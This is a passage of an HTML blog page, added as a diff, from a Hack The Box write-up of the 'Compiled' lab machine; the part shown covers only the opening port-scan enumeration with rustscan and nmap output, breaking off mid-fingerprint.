@@ -1,0 +1,786 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-compiled">Hack The Box: Compiled</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Compiled&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<p>Primero escaneo todos los puertos por TCP con <code>rustscan</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.255.250 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.255.250 -&gt; <span style="color:#f92672">[</span>3000,5000,7680<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Luego hago un escaneo mas exhaustivo con <code>nmap</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p3000,5000,7680 -sCV 10.129.255.250 -Pn -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-07-30 21:27 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.255.250
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, Help, RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Cache-Control: max-age<span style="color:#f92672">=</span>0, private, must-revalidate, no-transform
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>193f0f025a536eb6; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>|     Set-Cookie: _csrf<span style="color:#f92672">=</span>eKtRD6QCEx476Nv2f_giC15R3ec6MTcyMjM2MDQ4NzY3NzcxMjcwMA; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span>86400; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
+</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>|     Date: Tue, <span style="color:#ae81ff">30</span> Jul <span style="color:#ae81ff">2024</span> 17:28:07 GMT
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-US&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-arc-green&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Git&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manifest&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:application/json;base64,eyJuYW1lIjoiR2l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21waWxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVkLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMDA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.0 405 Method Not Allowed
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: HEAD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: HEAD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Set-Cookie: i_like_gitea=0d76a4cf591abb3e; Path=/; HttpOnly; SameSite=Lax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Set-Cookie: _csrf=3fUSP1-VxrsgO-QVe5dhPf2B7jo6MTcyMjM2MDQ5MzEwODAyOTkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     X-Frame-Options: SAMEORIGIN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Tue, 30 Jul 2024 17:28:13 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5000/tcp open  upnp?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| fingerprint-strings: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Server: Werkzeug/3.0.3 Python/3.12.3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Tue, 30 Jul 2024 17:28:07 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 5234
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>UTF-8<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1.0<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;Compiled - Code Compiling Services&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!-- Bootstrap CSS --&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!-- Custom CSS --&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;style&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     your custom CSS here */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     body {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     font-family: &#39;Ubuntu Mono&#39;, monospace;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     background-color: #272822;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     color: #ddd;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .jumbotron {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     background-color: #1e1e1e;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     color: #fff;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     padding: 100px 20px;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     margin-bottom: 0;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     .services {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   RTSPRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE HTML&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    &lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">7680/tcp open  pando-pub?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port3000-TCP:V=7.94SVN%I=7%D=7/30%Time=66A93EB6%P=x86_64-pc-linux-gnu%r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:(GenericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Ba
+</span></span><span style="display:flex;"><span>SF:d<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(GetRequest,37D5,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Cache-Contr
+</span></span><span style="display:flex;"><span>SF:ol:<span style="color:#ae81ff">\x</span>20max-age<span style="color:#f92672">=</span>0,<span style="color:#ae81ff">\x</span>20private,<span style="color:#ae81ff">\x</span>20must-revalidate,<span style="color:#ae81ff">\x</span>20no-transform<span style="color:#ae81ff">\r\n</span>Co
+</span></span><span style="display:flex;"><span>SF:ntent-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_git
+</span></span><span style="display:flex;"><span>SF:ea<span style="color:#f92672">=</span>193f0f025a536eb6;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly;<span style="color:#ae81ff">\x</span>20SameSite<span style="color:#f92672">=</span>Lax<span style="color:#ae81ff">\r\n</span>Set-Coo
+</span></span><span style="display:flex;"><span>SF:kie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>eKtRD6QCEx476Nv2f_giC15R3ec6MTcyMjM2MDQ4NzY3NzcxMjcwMA;<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>86400;<span style="color:#ae81ff">\x</span>20HttpOnly;<span style="color:#ae81ff">\x</span>20SameSite<span style="color:#f92672">=</span>Lax<span style="color:#ae81ff">\r\n</span>X-Frame-Opt
+</span></span><span style="display:flex;"><span>SF:ions:<span style="color:#ae81ff">\x</span>20SAMEORIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Tue,<span style="color:#ae81ff">\x</span>2030<span style="color:#ae81ff">\x</span>20Jul<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2017:28:07<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20GMT<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>the
+</span></span><span style="display:flex;"><span>SF:me-arc-green<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>widt
+</span></span><span style="display:flex;"><span>SF:h<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;title&gt;Git&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;link<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>data:application/json;base64,eyJuYW1lIjoiR2
+</span></span><span style="display:flex;"><span>SF:l0Iiwic2hvcnRfbmFtZSI6IkdpdCIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jb21wa
+</span></span><span style="display:flex;"><span>SF:WxlZC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNvbXBpbGVk
+</span></span><span style="display:flex;"><span>SF:Lmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l
+</span></span><span style="display:flex;"><span>SF:6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vZ2l0ZWEuY29tcGlsZWQuaHRiOjMwMD
+</span></span><span style="display:flex;"><span>SF:A<span style="color:#e6db74">&#34;)%r(Help,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20t
+</span></span><span style="display:flex;"><span>SF:ext/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20Request<span style="color:#e6db74">&#34;)%r(HTTPOptions,1A4,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20405<span style="color:#ae81ff">\x</span>20Method<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20All
+</span></span><span style="display:flex;"><span>SF:owed<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20HEAD<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20HEAD<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20GET<span style="color:#ae81ff">\r\n</span>Cache-Cont
+</span></span><span style="display:flex;"><span>SF:rol:<span style="color:#ae81ff">\x</span>20max-age<span style="color:#f92672">=</span>0,<span style="color:#ae81ff">\x</span>20private,<span style="color:#ae81ff">\x</span>20must-revalidate,<span style="color:#ae81ff">\x</span>20no-transform<span style="color:#ae81ff">\r\n</span>S
+</span></span><span style="display:flex;"><span>SF:et-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>0d76a4cf591abb3e;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly;<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0SameSite<span style="color:#f92672">=</span>Lax<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>3fUSP1-VxrsgO-QVe5dhPf2B7jo6MTcyM
+</span></span><span style="display:flex;"><span>SF:jM2MDQ5MzEwODAyOTkwMA;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>86400;<span style="color:#ae81ff">\x</span>20HttpOnly;<span style="color:#ae81ff">\x</span>20Sam
+</span></span><span style="display:flex;"><span>SF:eSite<span style="color:#f92672">=</span>Lax<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>20SAMEORIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Tue,<span style="color:#ae81ff">\x</span>2030<span style="color:#ae81ff">\x</span>20J
+</span></span><span style="display:flex;"><span>SF:ul<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2017:28:13<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:equest,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/
+</span></span><span style="display:flex;"><span>SF:plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Re
+</span></span><span style="display:flex;"><span>SF:quest<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port5000-TCP:V=7.94SVN%I=7%D=7/30%Time=66A93EB7%P=x86_64-pc-linux-gnu%r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:(GetRequest,1521,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Server:<span style="color:#ae81ff">\x</span>20Werkzeug/3<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span><span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20Python/3<span style="color:#ae81ff">\.</span>12<span style="color:#ae81ff">\.</span>3<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Tue,<span style="color:#ae81ff">\x</span>2030<span style="color:#ae81ff">\x</span>20Jul<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2017:28:07<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length
+</span></span><span style="display:flex;"><span>SF::<span style="color:#ae81ff">\x</span>205234<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20l
+</span></span><span style="display:flex;"><span>SF:ang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>UTF-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Compiled<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Code<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20Compiling<span style="color:#ae81ff">\x</span>20Services&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;!--<span style="color:#ae81ff">\x</span>20Bootstrap<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:CSS<span style="color:#ae81ff">\x</span>20--&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https
+</span></span><span style="display:flex;"><span>SF:://stackpath<span style="color:#ae81ff">\.</span>bootstrapcdn<span style="color:#ae81ff">\.</span>com/bootstrap/4<span style="color:#ae81ff">\.</span>5<span style="color:#ae81ff">\.</span>2/css/bootstrap<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>c
+</span></span><span style="display:flex;"><span>SF:ss<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;!--<span style="color:#ae81ff">\x</span>20Custom<span style="color:#ae81ff">\x</span>20CSS<span style="color:#ae81ff">\x</span>20--&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;s
+</span></span><span style="display:flex;"><span>SF:tyle&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20/<span style="color:#ae81ff">\*\x</span>20Add<span style="color:#ae81ff">\x</span>20your<span style="color:#ae81ff">\x</span>20custom<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
